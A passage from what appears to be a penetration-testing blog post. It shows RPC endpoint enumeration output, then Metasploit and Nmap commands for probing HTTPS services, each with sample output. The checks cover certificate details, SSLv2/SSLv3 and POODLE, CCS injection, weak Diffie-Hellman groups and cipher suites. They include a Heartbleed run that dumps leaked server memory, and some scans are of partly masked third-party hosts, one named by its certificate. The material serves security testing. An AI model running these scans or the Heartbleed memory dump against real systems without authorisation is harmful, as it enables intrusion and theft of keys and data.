</span><span class='line'>Provider: N/A 
</span><span class='line'>UUID    : 3473DD4D-2E88-4006-9CBA-22570909DD10 v5.1 WinHttp Auto-Proxy Service
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\W32TIME_ALT]
</span><span class='line'>          ncalrpc:[W32TIME_ALT]
</span><span class='line'>          ncalrpc:[LRPC-37912a0de47813b4b3]
</span><span class='line'>          ncalrpc:[OLE6ECE1F6A513142EC99562256F849]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: winlogon.exe 
</span><span class='line'>UUID    : 76F226C3-EC14-4325-8A99-6A46348418AF v1.0 
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[WMsgKRpc07ED51]
</span><span class='line'>          ncalrpc:[WindowsShutdown]
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\InitShutdown]
</span><span class='line'>          ncalrpc:[WMsgKRpc07EB30]
</span><span class='line'>          ncalrpc:[WMsgKRpc0530E42]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-FASP]: Firewall and Advanced Security Protocol 
</span><span class='line'>Provider: FwRemoteSvr.dll 
</span><span class='line'>UUID    : 6B5BDD1E-528C-422C-AF8C-A4079BE4FE48 v1.0 Remote Fw APIs
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49176]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-RPRN]: Print System Remote Protocol 
</span><span class='line'>Provider: spoolsv.exe 
</span><span class='line'>UUID    : 12345678-1234-ABCD-EF00-0123456789AB v1.0 IPSec Policy agent endpoint
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[LRPC-dbe8204e618ba8177d]
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49176]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: certprop.dll 
</span><span class='line'>UUID    : 30B044A5-A225-43F0-B3A4-E060DF91F9C1 v1.0 
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\srvsvc]
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49154]
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\atsvc]
</span><span class='line'>          ncalrpc:[senssvc]
</span><span class='line'>          ncalrpc:[OLEEC91239AB64E4F319A44EB95228B]
</span><span class='line'>          ncalrpc:[IUserProfile2]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-LSAT]: Local Security Authority (Translation Methods) Remote 
</span><span class='line'>Provider: lsasrv.dll 
</span><span class='line'>UUID    : 12345778-1234-ABCD-EF00-0123456789AB v0.0 
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_http:10.10.xx.xx[49157]
</span><span class='line'>          ncalrpc:[NTDS_LPC]
</span><span class='line'>          ncalrpc:[OLEAE08BC51A54440268646C1D21882]
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49155]
</span><span class='line'>          ncalrpc:[samss lpc]
</span><span class='line'>          ncalrpc:[dsrole]
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\protected_storage]
</span><span class='line'>          ncalrpc:[protected_storage]
</span><span class='line'>          ncalrpc:[lsasspirpc]
</span><span class='line'>          ncalrpc:[lsapolicylookup]
</span><span class='line'>          ncalrpc:[LSARPC_ENDPOINT]
</span><span class='line'>          ncalrpc:[securityevent]
</span><span class='line'>          ncalrpc:[audit]
</span><span class='line'>          ncalrpc:[LRPC-4fe30eeeeebfea13c2]
</span><span class='line'>          ncacn_np:\\ADS[\pipe\lsass]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-NRPC]: Netlogon Remote Protocol 
</span><span class='line'>Provider: netlogon.dll 
</span><span class='line'>UUID    : 12345678-1234-ABCD-EF00-01234567CFFB v1.0 
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49158]
</span><span class='line'>          ncacn_http:10.10.xx.xx[49157]
</span><span class='line'>          ncalrpc:[NTDS_LPC]
</span><span class='line'>          ncalrpc:[OLEAE08BC51A54440268646C1D21882]
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49155]
</span><span class='line'>          ncalrpc:[samss lpc]
</span><span class='line'>          ncalrpc:[dsrole]
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\protected_storage]
</span><span class='line'>          ncalrpc:[protected_storage]
</span><span class='line'>          ncalrpc:[lsasspirpc]
</span><span class='line'>          ncalrpc:[lsapolicylookup]
</span><span class='line'>          ncalrpc:[LSARPC_ENDPOINT]
</span><span class='line'>          ncalrpc:[securityevent]
</span><span class='line'>          ncalrpc:[audit]
</span><span class='line'>          ncalrpc:[LRPC-4fe30eeeeebfea13c2]
</span><span class='line'>          ncacn_np:\\ADS[\pipe\lsass]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: MPSSVC.dll 
</span><span class='line'>UUID    : 7F9D11BF-7FB9-436B-A812-B2D50C5D4C03 v1.0 Fw APIs
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[LRPC-5409763072e46c4586]
</span><span class='line'>
</span><span class='line'>[*] Received 189 endpoints.</span></code></pre></td></tr></table></div></figure>


<h3>HTTPS | Port 443 and 8443</h3>

<p><strong>Metasploit</strong> has below modules which we found useful are</p>

<ol>
<li><strong>HTTP SSL Certificate Information</strong> which parses the server SSL certificate to obtain the common name and 
  signature algorithm.

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/http/ssl
</span><span class='line'>services -p 443 -u -R</span></code></pre></td></tr></table></div></figure>

Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] 10.10.xx.xx:443 Subject: /OU=Domain Control Validated/CN=www.example.com
</span><span class='line'>[*] 10.10.xx.xx:443 Issuer: /C=US/ST=Arizona/L=Scottsdale/O=GoDaddy.com, Inc./OU=http://certs.godaddy.com/repository//CN=Go Daddy Secure Certificate Authority - G2
</span><span class='line'>[*] 10.10.xx.xx:443 Signature Alg: sha256WithRSAEncryption
</span><span class='line'>[*] 10.10.xx.xx:443 Public Key Size: 2048 bits
</span><span class='line'>[*] 10.10.xx.xx:443 Not Valid Before: 2016-01-12 10:01:38 UTC
</span><span class='line'>[*] 10.10.xx.xx:443 Not Valid After: 2017-02-26 09:13:38 UTC
</span><span class='line'>[+] 10.10.xx.xx:443 Certificate contains no CA Issuers extension... possible self signed certificate
</span><span class='line'>[*] 10.10.xx.xx:443 has common name www.example.com
</span><span class='line'>[*] Scanned 1 of 1 hosts (100% complete)
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>

and</li>
<li> <strong>HTTP SSL/TLS Version Detection (POODLE scanner)</strong>. If a web server can successfully establish an SSLv3 session, it is likely to be vulnerable to the POODLE attack.

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/http/ssl_version</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 10.10.xx.xx:443 accepts SSLv3</span></code></pre></td></tr></table></div></figure>
</li>

<li><strong>OpenSSL Server-Side ChangeCipherSpec Injection Scanner</strong> which checks for the OpenSSL ChangeCipherSpec (CCS) Injection vulnerability. The problem exists in the handling of early CCS messages during session negotiation. There's a NSE for the same ssl-ccs-injection.nse.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/ssl/openssl_ccs</span></code></pre></td></tr></table></div></figure></li>

<li><strong>OpenSSL Heartbeat (Heartbleed) Information Leak</strong> which is implements the OpenSSL Heartbleed attack. The module supports several 
  actions, allowing for scanning, dumping of memory contents, and private key recovery. It has three Actions: SCAN, KEYS, DUMP which scans the host for the vulnerablity, scan for the private keys and dump the memory of the host. 

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/ssl/openssl_heartbleed </span></code></pre></td></tr></table></div></figure>

SCAN Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 10.10.xx.xx:443 - Heartbeat response with leak</span></code></pre></td></tr></table></div></figure>

DUMP Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 10.10.xx.xx:443 - Heartbeat response with leak
</span><span class='line'>[*] 10.10.xx.xx:443 - Heartbeat data stored in /root/.msf5/loot/20160403185025_default_10.10.235.69_openssl.heartble_299937.bin
</span><span class='line'>
</span><span class='line'>hexdump -C /root/.msf5/loot/20160403185025_default_10.10.xx.xx_openssl.heartble_299937.bin | more 
</span><span class='line'>00000000  02 ff ff 94 03 01 57 00  0f a8 cf 31 3f 02 84 0b  |......W....1?...|
</span><span class='line'>00000010  59 9a d1 6b 3b 20 7b 7b  75 6b 17 2c 03 8d 8d 6a  |Y..k; \{\{uk.,...j|
</span><span class='line'>00000020  77 de b2 3a e3 28 00 00  66 c0 14 c0 0a c0 22 c0  |w..:.(..f.....".|
</span><span class='line'>00000030  21 00 39 00 38 00 88 00  87 00 87 c0 0f 00 35 00  |!.9.8.........5.|
</span><span class='line'>00000040  84 c0 12 c0 08 c0 1c c0  1b 00 16 00 13 c0 0d c0  |................|
</span><span class='line'>00000050  03 00 0a c0 13 c0 09 c0  1f c0 1e 00 33 00 32 00  |............3.2.|
</span><span class='line'>00000060  9a 00 99 00 45 00 44 c0  0e c0 04 00 2f 00 96 00  |....E.D...../...|
</span><span class='line'>00000070  41 c0 11 c0 07 c0 0c c0  02 00 05 00 04 00 15 00  |A...............|
</span><span class='line'>00000080  12 00 09 00 14 00 11 00  08 00 06 00 03 00 ff 01  |................|
</span><span class='line'>00000090  00 00 05 00 0f 00 01 01  06 03 02 03 04 02 02 02  |................|
</span><span class='line'>000000a0  07 c0 0c c0 02 00 05 00  04 00 15 00 12 00 09 00  |................|
</span><span class='line'>000000b0  ff 02 01 00 00 85 00 00  00 12 00 10 00 00 0d 32  |...............1|
</span><span class='line'>000000c0  32 33 2e 33 30 2e 32 33  35 2e 36 36 00 0b 00 04  |10.10.xx.xx....|
</span><span class='line'>000000d0  03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19  |.......4.2......|
</span><span class='line'>000000e0  00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08  |................|
</span><span class='line'>000000f0  00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13  |................|
</span><span class='line'>00000100  00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00  |.............#..|
</span><span class='line'>00000110  00 0d 00 22 00 20 06 01  06 02 06 03 05 01 05 02  |...". ..........|
</span><span class='line'>00000120  05 03 04 01 04 02 04 03  03 01 03 02 03 03 02 01  |................|
</span><span class='line'>00000130  02 02 02 03 01 01 00 0f  00 01 01 00 00 00 00 00  |................|
</span><span class='line'>00000140  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></code></pre></td></tr></table></div></figure>
</li>
</ol>


<p><strong>Nmap NSE</strong>:
Nmap has around</p>

<ol>
<li><a href="https://nmap.org/nsedoc/scripts/ssl-cert.html">ssl-cert.nse</a>: Retrieves a server's SSL certificate. The amount of information printed about the certificate depends on the verbosity level. With no extra verbosity, the script prints the validity period and the commonName, organizationName, stateOrProvinceName, and countryName of the subject.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sV -sC -p 443 10.10.xx.xx -n -vv
</span><span class='line'>Nmap scan report for 10.10.xx.xx
</span><span class='line'>Host is up, received reset ttl 60 (0.011s latency).
</span><span class='line'>Scanned at 2016-04-03 18:58:50 IST for 57s
</span><span class='line'>PORT    STATE SERVICE  REASON         VERSION
</span><span class='line'>443/tcp open  ssl/http syn-ack ttl 53 Apache httpd
</span><span class='line'>| ssl-cert: Subject: commonName=astarouflex.flexfilm.com/organizationName=Uflex/countryName=in/localityName=Noida
</span><span class='line'>| Issuer: commonName=virstech WebAdmin CA/organizationName=virstech/countryName=in/emailAddress=g@gmail.com/localityName=dehli
</span><span class='line'>| Public Key type: rsa
</span><span class='line'>| Public Key bits: 1024
</span><span class='line'>| Signature Algorithm: sha1WithRSAEncryption
</span><span class='line'>| Not valid before: 2013-02-01T13:27:36
</span><span class='line'>| Not valid after:  2038-01-01T00:00:01
</span><span class='line'>| MD5:   c213 2536 95b4 0fbd 0784 5a68 f2c0 3979
</span><span class='line'>| SHA-1: 5f8d 5cf5 6f5c 8b23 dc49 83ec 6251 b050 3fda 997e
</span><span class='line'>| -----BEGIN CERTIFICATE-----
</span><span class='line'>| MIIDOTCCAqKgAwIBAgIJANqxAruC7sYGMA0GCSqGSIb3DQEBBQUAMGsxCzAJBgNV
</span><span class='line'>| BAYTAmluMQ4wDAYDVQQHEwVkZWhsaTERMA8GA1UEChMIdmlyc3RlY2gxHTAbBgNV
</span><span class='line'>| BAMTFHZpcnN0ZWNoIFdlYkFkbWluIENBMRowGAYJKoZIhvcNAQkBFgtnQGdtYWls
</span><span class='line'>| LmNvbTAeFw0xMzAyMDExMzI3MzZaFw0zODAxMDEwMDAwMDFaMFAxCzAJBgNVBAYT
</span><span class='line'>| AmluMQ4wDAYDVQQHEwVOb2lkYTEOMAwGA1UEChMFVWZsZXgxITAfBgNVBAMTGGFz
</span><span class='line'>| dGFyb3VmbGV4LmZsZXhmaWxtLmNvbTCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkC
</span><span class='line'>| gYEAl09PwQfNKGMaqzD7CYLMQOskqMcP6MXJcPuHBl8wFte4M4yDzRTGJwEjmv9u
</span><span class='line'>| mcvv2HShww0nMXS2XEosjy65I2NqRBBFQ/+DmXtdiuoiWBeMk0OhV94fgSwDnhB/
</span><span class='line'>| 83RYyzKGMfKwOb63ovp8D78ufysPxqL8O49o+1bFMQYCoW0CAwEAAaOB/zCB/DAd
</span><span class='line'>| BgNVHQ4EFgQUvgIR5fXbkeXtnlT4jjKuhnUHacgwgZ0GA1UdIwSBlTCBkoAUGIfJ
</span><span class='line'>| GJvPoIGIJDyq9tgpKxU3gJihb6RtMGsxCzAJBgNVBAYTAmluMQ4wDAYDVQQHEwVk
</span><span class='line'>| ZWhsaTERMA8GA1UEChMIdmlyc3RlY2gxHTAbBgNVBAMTFHZpcnN0ZWNoIFdlYkFk
</span><span class='line'>| bWluIENBMRowGAYJKoZIhvcNAQkBFgtnQGdtYWlsLmNvbYIJANqxAruC7sYCMCMG
</span><span class='line'>| A1UdEQQcMBqCGGFzdGFyb3VmbGV4LmZsZXhmaWxtLmNvbTAJBgNVHRMEAjAAMAsG
</span><span class='line'>| A1UdDwQEAwIF4DANBgkqhkiG9w0BAQUFAAOBgQAentiShYI/t/XkWZrMe2E98RMs
</span><span class='line'>| yoD+BgYGxe6Gwn+L3pbb8oM5bxxmkydwVENNVrOG+kp1imU75HYge4QtHldjFf0y
</span><span class='line'>| i0myyr1jZ2IcnidcaYm/LhOFIUUmuP5YwDRK6jpIuJvzjDRcDxL63E9r950/f4jn
</span><span class='line'>| DrGIgqEJr7O9HKO7Tw==
</span><span class='line'>|_-----END CERTIFICATE-----</span></code></pre></td></tr></table></div></figure>
</li>

<li><a href="https://nmap.org/nsedoc/scripts/ssl-dh-params.html">ssl-dh-params.nse</a>: Weak ephemeral Diffie-Hellman parameter detection for SSL/TLS services.

This script simulates SSL/TLS handshakes using ciphersuites that have ephemeral Diffie-Hellman as the key exchange algorithm.

Diffie-Hellman MODP group parameters are extracted and analyzed for vulnerability to Logjam (CVE 2015-4000) and other weaknesses.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap --script=ssl-dh-params -p 443 10.10.xx.xx -n
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-03 19:08 IST
</span><span class='line'>Nmap scan report for 10.10.xx.xx
</span><span class='line'>Host is up (0.013s latency).
</span><span class='line'>PORT    STATE SERVICE
</span><span class='line'>443/tcp open  https
</span><span class='line'>| ssl-dh-params: 
</span><span class='line'>|   VULNERABLE:
</span><span class='line'>|   Diffie-Hellman Key Exchange Insufficient Group Strength
</span><span class='line'>|     State: VULNERABLE
</span><span class='line'>|       Transport Layer Security (TLS) services that use Diffie-Hellman groups of
</span><span class='line'>|       insufficient strength, especially those using one of a few commonly shared
</span><span class='line'>|       groups, may be susceptible to passive eavesdropping attacks.
</span><span class='line'>|     Check results:
</span><span class='line'>|       WEAK DH GROUP 1
</span><span class='line'>|             Cipher Suite: TLS_DHE_RSA_WITH_AES_256_GCM_SHA384
</span><span class='line'>|             Modulus Type: Safe prime
</span><span class='line'>|             Modulus Source: mod_ssl 2.2.x/1024-bit MODP group with safe prime modulus
</span><span class='line'>|             Modulus Length: 1024
</span><span class='line'>|             Generator Length: 8
</span><span class='line'>|             Public Key Length: 1024
</span><span class='line'>|     References:
</span><span class='line'>|_      https://weakdh.org
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 6.52 seconds</span></code></pre></td></tr></table></div></figure>
</li>

<li><a href="https://nmap.org/nsedoc/scripts/ssl-google-cert-catalog.html">ssl-google-cert-catalog.nse</a>: Queries Google's Certificate Catalog for the SSL certificates retrieved from target hosts.

The Certificate Catalog provides information about how recently and for how long Google has seen the given certificate. If a certificate doesn't appear in the database, despite being correctly signed by a well-known CA and having a matching domain name, it may be suspicious.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 443 --script ssl-google-cert-catalog 223.30.xx.xx -n
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-03 19:14 IST
</span><span class='line'>Nmap scan report for 223.30.xx.xx
</span><span class='line'>Host is up (0.028s latency).
</span><span class='line'>PORT    STATE SERVICE
</span><span class='line'>443/tcp open  https
</span><span class='line'>| ssl-google-cert-catalog: 
</span><span class='line'>|_  No DB entry</span></code></pre></td></tr></table></div></figure>

</li>
<li><a href="https://nmap.org/nsedoc/scripts/sslv2.html">sslv2.nse</a>: Determines whether the server supports obsolete and less secure SSLv2, and discovers which ciphers it supports.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 443 --script sslv2 115.124.xx.xx -n
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-03 19:24 IST
</span><span class='line'>Nmap scan report for 115.124.xx.xx
</span><span class='line'>Host is up (0.0088s latency).
</span><span class='line'>PORT    STATE SERVICE
</span><span class='line'>443/tcp open  https
</span><span class='line'>| sslv2: 
</span><span class='line'>|   SSLv2 supported
</span><span class='line'>|   ciphers: 
</span><span class='line'>|     SSL2_DES_192_EDE3_CBC_WITH_MD5
</span><span class='line'>|     SSL2_RC2_CBC_128_CBC_WITH_MD5
</span><span class='line'>|     SSL2_RC4_128_WITH_MD5
</span><span class='line'>|     SSL2_RC4_64_WITH_MD5
</span><span class='line'>|     SSL2_DES_64_CBC_WITH_MD5
</span><span class='line'>|     SSL2_RC2_CBC_128_CBC_WITH_MD5
</span><span class='line'>|_    SSL2_RC4_128_EXPORT40_WITH_MD5
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds</span></code></pre></td></tr></table></div></figure>
</li>
<li><a href="https://nmap.org/nsedoc/scripts/ssl-ccs-injection.html">ssl-ccs-injection.nse</a>: Detects whether a server is vulnerable to the SSL/TLS "CCS Injection" vulnerability (CVE-2014-0224). There's a metasploit module for the same: openssl_ccs</li>
<li><a href="https://nmap.org/nsedoc/scripts/ssl-date.html">ssl-date.nse</a>: Retrieves a target host's time and date from its TLS ServerHello response.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 443 --script ssl-date 115.124.xx.xx -n
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-03 19:29 IST
</span><span class='line'>Nmap scan report for 115.124.xx.xx
</span><span class='line'>Host is up (0.017s latency).
</span><span class='line'>PORT    STATE SERVICE
</span><span class='line'>443/tcp open  https
</span><span class='line'>|_ssl-date: 2016-04-03T18:49:19+00:00; +4h49m42s from scanner time.</span></code></pre></td></tr></table></div></figure></li>

<li><a href="https://nmap.org/nsedoc/scripts/ssl-enum-ciphers.html">ssl-enum-ciphers.nse</a>: Script repeatedly initiates SSLv3/TLS connections, each time trying a new cipher or compressor while recording whether a host accepts or rejects it. The end result is a list of all the ciphersuites and compressors that a server accepts.

Each ciphersuite is shown with a letter grade (A through F) indicating the strength of the connection. The grade is based on the cryptographic strength of the key exchange and of the stream cipher.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 443 --script ssl-enum-ciphers 115.124.xx.xx -n
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-03 19:33 IST
</span><span class='line'>Nmap scan report for 115.124.xx.xx
</span><span class='line'>Host is up (0.0085s latency).
</span><span class='line'>PORT    STATE SERVICE
</span><span class='line'>443/tcp open  https
</span><span class='line'>| ssl-enum-ciphers: 
</span><span class='line'>|   SSLv3: 
</span><span class='line'>|     ciphers: 
</span><span class='line'>|       TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA - E
</span><span class='line'>|       TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA (dh 1024) - F
</span><span class='line'>|       TLS_DHE_RSA_WITH_AES_128_CBC_SHA (dh 1024) - F
</span><span class='line'>|       TLS_DHE_RSA_WITH_AES_256_CBC_SHA (dh 1024) - F
</span><span class='line'>|       TLS_DHE_RSA_WITH_DES_CBC_SHA (dh 1024) - F
</span><span class='line'>|       TLS_RSA_EXPORT_WITH_DES40_CBC_SHA - E
</span><span class='line'>|       TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5 - E
</span><span class='line'>|       TLS_RSA_EXPORT_WITH_RC4_40_MD5 - E
</span><span class='line'>|       TLS_RSA_WITH_3DES_EDE_CBC_SHA - F
</span><span class='line'>|       TLS_RSA_WITH_AES_128_CBC_SHA - F
</span><span class='line'>|       TLS_RSA_WITH_AES_256_CBC_SHA - F
</span><span class='line'>|       TLS_RSA_WITH_DES_CBC_SHA - F
</span><span class='line'>|       TLS_RSA_WITH_RC4_128_MD5 - F
</span><span class='line'>|       TLS_RSA_WITH_RC4_128_SHA - F
</span><span class='line'>|     compressors: 
</span><span class='line'>|       NULL
</span><span class='line'>|     cipher preference: client
</span><span class='line'>|     warnings: 
</span><span class='line'>|       CBC-mode cipher in SSLv3 (CVE-2014-3566)
</span><span class='line'>|       Ciphersuite uses MD5 for message integrity
</span><span class='line'>|       Insecure certificate signature: MD5
</span><span class='line'>|   TLSv1.0: 
</span><span class='line'>|     ciphers: 
</span><span class='line'>|       TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA - E
</span><span class='line'>|       TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA (dh 1024) - F
</span><span class='line'>|       TLS_DHE_RSA_WITH_AES_128_CBC_SHA (dh 1024) - F
</span><span class='line'>|       TLS_DHE_RSA_WITH_AES_256_CBC_SHA (dh 1024) - F
</span><span class='line'>|       TLS_DHE_RSA_WITH_DES_CBC_SHA (dh 1024) - F
